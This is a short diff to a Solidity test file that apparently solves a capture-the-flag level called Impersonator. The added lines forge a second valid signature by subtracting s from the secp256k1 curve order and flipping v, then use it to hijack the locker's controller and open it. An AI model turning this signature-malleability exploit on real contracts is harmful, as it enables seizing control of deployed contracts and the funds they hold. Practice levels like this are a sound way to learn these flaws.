@@ -86,6 +86,10 @@ contract TestImpersonator is Test, Utils {
 
     /// @notice Test the solution for the level.
     function testSolve() public checkSolvedByPlayer{
-
+        ECLocker locker = instance.lockers(0);
+        console.logAddress(locker.controller());
+        bytes32 newS = bytes32(uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141) - uint256(s));
+        locker.changeController(28, r, newS, address(0));
+        locker.open(0, 0, 0);
     }
 }
